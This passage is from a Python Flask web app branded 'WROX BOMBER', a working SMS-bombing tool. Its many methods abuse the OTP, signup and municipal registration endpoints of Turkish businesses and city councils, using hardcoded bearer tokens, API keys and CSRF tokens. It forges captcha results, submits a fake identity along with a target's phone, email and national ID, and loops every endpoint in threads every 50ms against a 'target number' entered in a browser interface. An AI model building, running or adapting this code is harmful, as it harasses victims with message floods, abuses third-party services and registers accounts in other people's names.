            if r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS":
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Frink(self):
        try:
            url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": "", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "Frink/1.6.0 (com.frink.userapp; build:3; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
            json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90"+self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["processStatus"] == "SUCCESS":
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Bodrum(self):
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Content-Type": "application/json", "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en;q=0.9", "Token": "", "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Connection": "keep-alive"}
            json={"gsm": "+90"+self.phone, "source": "orwi"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass     
    
    def KofteciYusuf(self):
        try:
            url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
            headers = {"Content-Type": "application/json; charset=utf-8", "Anonymousclientid": "", "Accept": "application/json", "Ostype": "iOS", "Appversion": "4.0.4.0", "Accept-Language": "en-GB,en;q=0.9", "Firmaid": "82", "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq", "Accept-Encoding": "gzip, deflate, br", "Language": "tr-TR", "User-Agent": "YemekPosMobil/53 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
            json={"FireBaseCihazKey": None, "FirmaId": 82, "GuvenlikKodu": None, "Telefon": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["Success"] == True:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Little(self):
        try:
            url = "https://api.littlecaesars.com.tr:443/api/web/Member/Register"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json; charset=utf-8", "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjM1Zjc4YTFhNjJjNmViODJlNjQ4OTU0M2RmMWQ3MDFhIiwidHlwIjoiSldUIn0.eyJuYmYiOjE3MzkxMTA0NzIsImV4cCI6MTczOTcxNTI3MiwiaXNzIjoiaHR0cHM6Ly9hdXRoLmxpdHRsZWNhZXNhcnMuY29tLnRyIiwiYXVkIjpbImh0dHBzOi8vYXV0aC5saXR0bGVjYWVzYXJzLmNvbS50ci9yZXNvdXJjZXMiLCJsaXR0bGVjYWVzYXJzYXBpIl0sImNsaWVudF9pZCI6IndlYiIsInN1YiI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsImF1dGhfdGltZSI6MTczOTExMDQ3MiwiaWRwIjoibG9jYWwiLCJlbWFpbCI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsInVpZCI6IjI0IiwicGVyc29uaWQiOiIyMDAwNTA4NTU0NjYiLCJuYW1lc3VybmFtZSI6IkxDIER1bW15IiwibGN0b2tlbiI6IlFRcHZHRS1wVDBrZDQ2MjRVQjhUc01SRkxoUUZsUlhGS0toTWYwUlF3U0M4Tnd3M2pzdHd6QzJ3NmNldGRkMkZRdFo1eXpacHVGOE81REhwUWpCSnhKaG5YNVJOcWYyc3NrNHhkTi0zcjZ2T01fdWQzSW5KRDZYUFdSYlM3Tml5d1FHbjByUENxNC1BVE9pd09iR005YnZwUTRISzJhNTFGVTdfQ1R2a2JGUmswMUpwM01YbkJmU3V6OHZ4bTdUTS1Vc1pXZzJDTmVkajlWaXJzdHo2TUs4VXdRTXp6TFZkZHRTQ2lOOENZVWc1cVhBNjVJbEszamVLNnZwQ0EwZTdpem5wa2hKUFVqY1dBc1JLc0tieDB3Y2EycU1EYkl6VlJXdV8xSjF5SDNhWmxSV0w4eFhJYl82NG5jd1p1Yk9MeFpiUFRRZW5GWWxuOGxNY1JFUDFIdTlCOWJyOFd3QVNqMmRDa3g2NVo5S0NPR3FiIiwibGNyZWZyZXNodG9rZW4iOiI2NDUyYWQ4MzIzY2I0N2ZiOWFmMWM2M2EyYWIxMTJkMyIsInBlcnNvbmVtYWlsIjoibGNAZHVtbXkuY29tIiwic2NvcGUiOlsibGl0dGxlY2Flc2Fyc2FwaSIsIm9mZmxpbmVfYWNjZXNzIl0sImFtciI6WyI3NjU2QkFGM0YxNUE2NTA0QkJGM0NFRTgyOTA5MkRGQSJdfQ.SrG2kFdRTVAq0SCt17cmZ-i6Cl9MaQaOUwu1YQ2r27m5_9i5WkVUx_CUPbCNazHcmGt3IYHw9U6TxS-zAz4Jw5o-PbCWktwBiLJNfIsK4akCT4RjX8b7d4YX0yDz4WcIp43ViEsEkDKByHwz75GWdV9gSJtmAerGjZbIoN-OkgJIYAxzCCeGUSdOW2jspvZew9VQKEKVRYzdfZlcvoCV_2mYV122P0jU5i_0J4k_JH-ok7bMxNGqpaxEDSZ1WEuQxBRcXr7C7swcj4AJHHDuksvNrHjXnSjB0VQt5sB3JuwjGDJRuY2yFUlrI8l8W4x01Jm6kSn67G4h8hqyNixpRg", "X-Platform": "ios", "X-Version": "1.0.0", "User-Agent": "LittleCaesars/20 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
            json={"CampaignInform": True, "Email": self.mail, "InfoRegister": True, "IsLoyaltyApproved": True, "NameSurname": "Memati Bas", "Password": "31ABC..abc31", "Phone": self.phone, "SmsInform": True}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200 and r.json()["status"] == True:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
    
    def Orwi(self):
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Content-Type": "application/json", "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en;q=0.9", "Token": "", "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Connection": "keep-alive"}
            json={"gsm": f"+90{self.phone}", "source": "orwi"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Coffy(self):
        try:
            url = "https://user-api-gw.coffy.com.tr:443/user/signup"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Language": "en-GB,en;q=0.9", "Accept-Encoding": "gzip, deflate, br", "Language": "tr", "User-Agent": "coffy/5 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkIjoiNjdhOGM0MTc0MDY3ZDFmMzBkMDNmMmRlIiwidSI6IjY3YThjNDE3Njc5YTUxM2MyMzljMDc0YSIsInQiOjE3MzkxMTM0OTUyNjgsImlhdCI6MTczOTExMzQ5NX0.IQ_33PJ8s_CKMbJgp2sD1wIfFO852m5VfIxW-dv2-UA"}
            json={"countryCode": "90", "gsm": self.phone, "isKVKKAgreementApproved": True, "isUserAgreementApproved": True, "name": "Memati Bas"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Hamidiye(self):
        try:
            url = "https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "com.hamidiyeapp", "User-Agent": "hamidiyeapp/4 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
            json={"isGuest": False, "phone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["result"] == True:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Fatih(self):
        try:
            url = "https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=----geckoformboundaryc5b24584149b44839fea163e885475be", "Origin": "null", "Dnt": "1", "Sec-Gpc": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"}
            data = f"------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\nGKrki1TGUGJ0CBwKd4n5iRulER91aTo-44_PJdfM4_nxAK7aL1f0Ho9UuqG5lya_8RVBGD-j-tNjE93pZnW8RlRyrAEi6ry6uy8SEC20OPY1\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n28.12.1999\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMemati\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBas\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n------geckoformboundaryc5b24584149b44839fea163e885475be--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
            if r.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Sancaktepe(self):
        try:
            url = "https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=----geckoformboundary35479e29ca6a61a4a039e2d3ca87f112", "Origin": "null", "Dnt": "1", "Sec-Gpc": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"}
            data = f"------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\n21z_svqlZXLTEPZGuSugh8winOg_nSRis6rOL-96TmwGUHExtulBBRN9F2XBS_LvU28OyUsfMVdZQmeJlejCYZ1slOmqI63OX_FsQhCxwGk1\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n13.01.2000\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMEMAT\xc4\xb0\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBAS\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
            if r.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Bayrampasa(self):
        try:
            url = "https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=----geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b", "Origin": "null", "Dnt": "1", "Sec-Gpc": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers"}
            data = f"------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\nzOIiDXRlsw-KfS3JGnn-Vxdl5UP-ZNzjaA207_Az-5FfpsusGnNUxonzDkvoZ55Cszn3beOwk80WczRsSfazSZVxqMU0mMkO70gOe8BlbSg1\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n07.06.2000\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMEMAT\xc4\xb0\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBAS\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
            if r.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Money(self):
        try:
            url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.money.com.tr/money-kartiniz-var-mi", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.money.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            data = {"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ''}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["resultType"] == 0:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Alixavien(self):
        try:
            url = "https://www.alixavien.com.tr:443/api/member/sendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Referer": "https://www.alixavien.com.tr/UyeOl?srsltid=AfmBOoqrh4xzegqOPllnfc_4S0akofArgwZUErwoeOJzrqU16J1zksPj", "Content-Type": "application/json", "Origin": "https://www.alixavien.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers"}
            json={"Phone": self.phone, "XID": ""}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["isError"] == False:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

    def Jimmykey(self):
        try:
            r = requests.post(f"https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=6)
            if r.json()["Sonuc"] == True:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass
        
    def Ido(self):
        try:
            url = "https://api.ido.com.tr:443/idows/v2/register"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.ido.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.ido.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json={"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "pwd": "313131", "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True, "year": 1977}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                with self._lock:
                    self.adet += 1
            else:
                raise
        except:
            pass

# ============================================================
# ARKA PLAN İŞLEMLERİ (SÜREKLİ ATAK)
# ============================================================
class Bombardier:
    def __init__(self):
        self.running = False
        self.threads = []
        self.sms_instance = None
        self.total_sent = 0
        self.success_count = 0
        self.lock = threading.Lock()
        self.methods = self._get_methods()
        
    def _get_methods(self):
        methods = []
        for attr in dir(SendSms):
            if callable(getattr(SendSms, attr)) and not attr.startswith('__'):
                methods.append(attr)
        return methods
    
    def start(self, phone, mode='fast'):
        if self.running:
            return False
        self.running = True
        self.sms_instance = SendSms(phone, "")  # random mail
        # Her metod için bir thread başlat
        delay = 0.05 if mode == 'fast' else 1.0  # 50ms hızlı, 1sn yavaş
        for method_name in self.methods:
            t = threading.Thread(target=self._worker, args=(method_name, delay), daemon=True)
            t.start()
            self.threads.append(t)
        return True
    
    def _worker(self, method_name, delay):
        while self.running:
            # Başlangıç adet sayısını al
            before = self.sms_instance.adet
            try:
                getattr(self.sms_instance, method_name)()
            except:
                pass
            after = self.sms_instance.adet
            if after > before:
                with self.lock:
                    self.success_count += (after - before)
                    self.total_sent += 1  # her çağrıda bir gönderim denemesi
            else:
                with self.lock:
                    self.total_sent += 1
            time.sleep(delay)
    
    def stop(self):
        self.running = False
        for t in self.threads:
            if t.is_alive():
                t.join(timeout=0.5)
        self.threads = []
        return True
    
    def get_stats(self):
        with self.lock:
            return {
                'total_sent': self.total_sent,
                'success': self.success_count,
                'is_running': self.running,
                'methods': self.methods
            }

bombardier = Bombardier()

# ============================================================
# FLASK ROUTE'LARI
# ============================================================
@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/start')
def start_bomb():
    number = request.args.get('number', '')
    number = duzenle(number)
    if not number:
        return {'error': 'Geçersiz numara'}, 400
    mode = request.args.get('mode', 'fast')
    if bombardier.running:
        return {'error': 'Zaten çalışıyor'}, 400
    bombardier.start(number, mode)
    return {'status': 'started'}

@app.route('/stop')
def stop_bomb():
    bombardier.stop()
    return {'status': 'stopped'}

@app.route('/stats')
def stats():
    return jsonify(bombardier.get_stats())

def duzenle(num):
    num = num.replace(" ", "").replace("+", "").replace("-", "")
    if num.startswith("5") and len(num) == 10: return num
    if num.startswith("05") and len(num) == 11: return num[1:]
    if num.startswith("90") and len(num) == 12: return num[2:]
    return num if len(num) == 10 and num.isdigit() else None

# ============================================================
# HTML ŞABLON (SÜREKLİ STATS ÇEKER)
# ============================================================
HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WROX BOMBER</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0a;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:15px}
        .container{background:#0d0d0d;border:2px solid #00ff41;border-radius:20px;padding:25px;width:100%;max-width:420px;position:relative}
        .menu-toggle{position:absolute;top:15px;right:20px;font-size:28px;color:#00ff41;cursor:pointer;z-index:10;user-select:none}
        .menu-dropdown{display:none;background:#111;border:1px solid #00ff41;border-radius:12px;padding:15px;margin-top:10px}
        .menu-dropdown.show{display:block}
        .menu-item{display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid #1a1a1a}
        .menu-item:last-child{border-bottom:none}
        .menu-item label{color:#00ff41;font-size:14px;cursor:pointer}
        .menu-item input[type="radio"]{accent-color:#00ff41;width:18px;height:18px}
        h1{text-align:center;color:#00ff41;font-size:28px}
        .sub{text-align:center;color:#444;font-size:12px;margin-bottom:20px}
        label{color:#00ff41;font-size:14px;display:block;margin-bottom:8px}
        input{width:100%;padding:14px;background:#111;border:2px solid #1a1a1a;border-radius:12px;color:#00ff41;font-size:20px;text-align:center;outline:none}
        input:focus{border-color:#00ff41}
        .btn-group{display:flex;gap:10px;margin:15px 0}
        button{flex:1;padding:14px;border:none;border-radius:12px;font-weight:bold;font-size:16px;cursor:pointer}
        .btn-start{background:#00ff41;color:#0a0a0a}
        .btn-start:disabled{opacity:0.3}
        .btn-stop{background:#ff0033;color:#fff}
        .btn-stop:disabled{opacity:0.3}
        .stats{background:#111;padding:15px;border-radius:12px;margin:10px 0}
        .stat-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #1a1a1a}
        .stat-row:last-child{border-bottom:none}
        .stat-label{color:#666;font-size:13px}
        .stat-value{color:#00ff41;font-weight:bold}
        .status{text-align:center;padding:10px;border-radius:10px;margin-top:10px;font-weight:bold;font-size:14px}
        .active{background:rgba(0,255,65,0.1);color:#00ff41;border:1px solid #00ff41}
        .idle{background:rgba(255,255,255,0.02);color:#444;border:1px solid #1a1a1a}
        .error{color:#ff0033;text-align:center;font-size:13px;min-height:20px}
        .footer{text-align:center;color:#1a1a1a;font-size:10px;margin-top:15px}
        .api-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:4px;margin-top:10px;max-height:180px;overflow-y:auto;padding-right:4px}
        .api-item{font-size:9px;padding:4px;border-radius:6px;text-align:center;font-weight:600;color:#444;border:1px solid #1a1a1a}
        @media (max-width:480px){.api-grid{grid-template-columns:1fr 1fr}}
    </style>
</head>
<body>
<div class="container">
    <div class="menu-toggle" onclick="toggleMenu()">☰</div>
    <div class="menu-dropdown" id="menuDropdown">
        <div class="menu-item">
            <input type="radio" name="mode" value="fast" id="modeFast" checked>
            <label for="modeFast">🚀 Hızlı (50ms)</label>
        </div>
        <div class="menu-item">
            <input type="radio" name="mode" value="slow" id="modeSlow">
            <label for="modeSlow">🐢 Yavaş (1sn)</label>
        </div>
    </div>

    <h1>⚡ WROX#FLEX</h1>
    <div class="sub">ULTRA FAST BOMBER v9.0</div>
    
    <label>📱 HEDEF NUMARA</label>
    <input type="tel" id="number" placeholder="5XXXXXXXXX" maxlength="10">
    
    <div class="btn-group">
        <button class="btn-start" id="startBtn" onclick="startBomb()">🔥 BAŞLAT</button>
        <button class="btn-stop" id="stopBtn" onclick="stopBomb()" disabled>⏹ DURDUR</button>
    </div>
    
    <div id="error" class="error"></div>
    
    <div class="stats">
        <div class="stat-row"><span class="stat-label">📊 DURUM</span><span class="stat-value" id="statusText">HAZIR</span></div>
        <div class="stat-row"><span class="stat-label">📱 HEDEF</span><span class="stat-value" id="targetText">-</span></div>
        <div class="stat-row"><span class="stat-label">📨 GÖNDERİM</span><span class="stat-value" id="totalText">0</span></div>
        <div class="stat-row"><span class="stat-label">✅ BAŞARILI</span><span class="stat-value" id="successText">0</span></div>
    </div>
    
    <div id="statusBox" class="status idle">⚡ SİSTEM HAZIR</div>
    <div id="apiGrid" class="api-grid"></div>
    <div class="footer">WROX TEAM</div>
</div>

<script>
var isRunning = false;
var targetNumber = '';
var mode = 'fast';
var statsInterval = null;

function toggleMenu() {
    document.getElementById('menuDropdown').classList.toggle('show');
}
document.querySelectorAll('input[name="mode"]').forEach(function(el) {
    el.addEventListener('change', function() {
        mode = this.value;
    });
});

function updateUI(stats) {
    if (!stats) return;
    document.getElementById('statusText').textContent = stats.is_running ? '🔥 AKTİF' : '💤 HAZIR';
    document.getElementById('targetText').textContent = targetNumber ? '+90'+targetNumber : '-';
    document.getElementById('totalText').textContent = stats.total_sent || 0;
    document.getElementById('successText').textContent = stats.success || 0;
    var box = document.getElementById('statusBox');
    if (stats.is_running) {
        box.className = 'status active';
        box.textContent = '🔥 +90'+targetNumber+' BOMBALANIYOR ('+mode+')';
    } else {
        box.className = 'status idle';
        box.textContent = '⚡ SİSTEM HAZIR';
    }
    document.getElementById('startBtn').disabled = stats.is_running;
    document.getElementById('stopBtn').disabled = !stats.is_running;
    
    // API listesini göster (sadece isimler)
    var grid = document.getElementById('apiGrid');
    if (stats.methods) {
        grid.innerHTML = '';
        stats.methods.forEach(function(name) {
            var div = document.createElement('div');
            div.className = 'api-item';
            div.textContent = name;
            grid.appendChild(div);
        });
    }
}

async function fetchStats() {
    try {
        var resp = await fetch('/stats');
        var data = await resp.json();
        updateUI(data);
    } catch(e) {}
}

async function startBomb() {
    var number = document.getElementById('number').value.trim();
    if (!number || number.length != 10) {
        document.getElementById('error').textContent = '❌ 10 haneli numara girin!';
        return;
    }
    document.getElementById('error').textContent = '';
    targetNumber = number;
    try {
        var resp = await fetch('/start?number='+number+'&mode='+mode);
        var data = await resp.json();
        if (data.error) {
            document.getElementById('error').textContent = '❌ '+data.error;
            return;
        }
        if (statsInterval) clearInterval(statsInterval);
        statsInterval = setInterval(fetchStats, 300);
        await fetchStats();
    } catch(e) {
        document.getElementById('error').textContent = '❌ Bağlantı hatası!';
    }
}

async function stopBomb() {
    try {
        await fetch('/stop');
        if (statsInterval) {
            clearInterval(statsInterval);
            statsInterval = null;
        }
        await fetchStats();
    } catch(e) {}
}

document.getElementById('number').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') startBomb();
});
document.getElementById('number').addEventListener('input', function(e) {
    this.value = this.value.replace(/[^0-9]/g, '');
});

// Başlangıçta stat al
fetchStats();
</script>
</body>
</html>
"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=False)
